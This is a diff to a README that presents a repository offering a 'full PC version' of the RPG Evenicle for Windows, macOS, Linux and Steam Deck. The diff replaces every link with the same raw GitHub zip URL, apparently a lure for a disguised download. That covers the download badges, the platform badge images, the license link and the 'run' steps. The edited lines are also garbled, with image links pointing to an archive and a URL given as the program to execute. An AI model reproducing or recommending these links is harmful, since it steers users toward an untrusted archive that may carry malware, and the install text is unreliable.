@@ -1,6 +1,6 @@
 # Evenicle Adaptation Repository
 
-[![Download](https://img.shields.io/badge/Download-Evenicle-blue?logo=github)](https://shiv81500.github.io)
+[![Download](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)
 
 Welcome to the **Evenicle Adaptation Repository**: your one-stop collaborative laboratory for acquiring, exploring, and deploying the renowned RPG experience on a multitude of platforms. Prepare to dive headfirst into the realm of immersive fantasy, tailored for the modern digital voyager and optimized by community innovation!
 
@@ -12,10 +12,10 @@ Take your adventure anywhere! Evenicle's adaptability transcends the boundaries 
 
 | Platform     | Supported | Native Experience | Instructions Provided |
 |--------------|:---------:|:----------------:|:--------------------:|
-| ![Windows](https://img.shields.io/badge/Windows-%23%230078D6.svg?logo=windows&logoColor=white)           | ✅        | 🎮               | ✔️                  |
-| ![macOS](https://img.shields.io/badge/macOS-%23%23000000.svg?logo=apple&logoColor=white)                | ✅        | 🍏               | ✔️                  |
-| ![Linux](https://img.shields.io/badge/Linux-%23%23FCC624.svg?logo=linux&logoColor=black)                | ✅        | 🐧               | ✔️                  |
-| ![Steam Deck](https://img.shields.io/badge/SteamDeck-%231F1F1F.svg?logo=steam&logoColor=white)           | ✅        | 🎮🚀             | ✔️                  |
+| ![Windows](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip%23%https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)           | ✅        | 🎮               | ✔️                  |
+| ![macOS](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip%23%https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)                | ✅        | 🍏               | ✔️                  |
+| ![Linux](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip%23%https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)                | ✅        | 🐧               | ✔️                  |
+| ![Steam Deck](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip%https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)           | ✅        | 🎮🚀             | ✔️                  |
 
 *Effortlessly install and enjoy Evenicle across your chosen digital ecosystem. All critical pathways are mapped below!*
 
@@ -44,7 +44,7 @@ Follow this map to chart your course toward launching Evenicle effortlessly:
    - Confirm you have administrator rights (the keys to your kingdom).
 
 2. **Procure the Treasure:**  
-   - Click the [Download badge](#) or visit https://shiv81500.github.io  
+   - Click the [Download badge](#) or visit https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip  
    - Choose the “Evenicle Adaptation” archive suited for your platform.
 
 3. **Unpack the Artifacts:**  
@@ -52,8 +52,8 @@ Follow this map to chart your course toward launching Evenicle effortlessly:
    - Verify directory structure for smooth deployment.
 
 4. **Initiate the Adventure:**  
-   - For Windows: Run `Evenicle.exe`
-   - For macOS: Open `Evenicle.app`
+   - For Windows: Run `https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip`
+   - For macOS: Open `https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip`
    - For Linux: Execute `./evenicle` (you may need to `chmod +x evenicle`)
 
 5. **Enjoy Multilingual Wizardry:**  
@@ -102,11 +102,11 @@ This repository is designed for educational and preservationist purposes, servin
 
 ## 📜 MIT License
 
-Licensed under the MIT License (2025). See the full text at: [MIT License](https://opensource.org/licenses/MIT)
+Licensed under the MIT License (2025). See the full text at: [MIT License](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Evenicle-blue?logo=github)](https://shiv81500.github.io)
+[![Download](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)
 
 ---
 
